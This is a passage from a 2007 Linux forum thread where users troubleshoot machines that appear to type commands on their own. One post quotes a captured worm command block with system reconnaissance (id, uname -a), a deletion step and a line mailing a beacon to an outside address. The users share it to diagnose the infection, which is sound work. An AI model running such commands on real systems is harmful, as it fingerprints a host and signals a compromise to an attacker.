So - I have them all disconnected obviously, but will be looking more at this tonight.

I won;t hijack this thread, but if I find that it's the same thing when I get to look at one of these laptops I'll post results here, maybe it can help the OP.

Regardless though - as many of the previous posters have said, it's best to reinstall once you find out what the problem is so you can prevent in the future.

Keeping good backups can alleviate re installation hassle also... I speak from many painful experiences.

---

### Post by jnorth on 2007-03-13
Well, somewhat similar but not quite the same...  here is an excerpt that happened to pop up on a command prompt:

```
:k &del ik &msupdate &exit
w
id
name 0a
name -a
uname -a
echo gg | mail techworm_x@yahoo.com
```

Nothing in crontab, /etc, init.d scripts - rkhunter and chkrootkit say clean.
Still looking around before I reinstall though to see if it's anything similar to the OP's problem...

Just seemed similar since my guy said that Kate (on Kubuntu) just opened up and started typing code about msupdate, did the same thing in firefox's search box.

---

### Post by Mr. C. on 2007-03-13
Thanks for sharing what you are finding.  I hope others pick up on how these worms use a pleothora of commands to start system identification, which can then be used for additional attacks.

MrC

---

### Post by ajmannen on 2007-03-16
System32 is not a part of Ubuntu, it's a part of windows. i had Windows XP until some virus came and f**** up the entire of System32 so my computer would work :( 

But then i found Ubuntu :) :KS

---

### Post by Mr. C. on 2007-03-16
> **ajmannen said:**
> System32 is not a part of Ubuntu, it's a part of windows.

This party ended days ago, but glad you stopped by.

MrC

---

### Post by yesidh on 2007-07-25
I'm having this same issue, for some time.

I can see there was no solution, but I would like to explore any fix. What I can noticed it that there is some kind of software that tried to open windows, I supposed in windows getting the "Execute" program. to run the "cmd".

My ubuntu 6.10 has dual boot with a Windows XP, I'm not considering formatting the computer, but I do need some solution. On the other hand I would like to know if there is any chance that upgrading the version to 7.04 the problem can go?

That's because I have a ubuntu 7.04 on the same network and this one doesn't have the problem.

I'm thinking this can come from my ISP or some computer connected to the same ISP, surely a Windows box. That's bacuse I search for the IP location and it's in Colombia (where I am), and the host is some name related to my ISP.

Any help will be appreciate.

---

### Post by croto on 2007-07-26
A script typing itself????? Have you guys enabled any sort of Remote Desktop access?

---

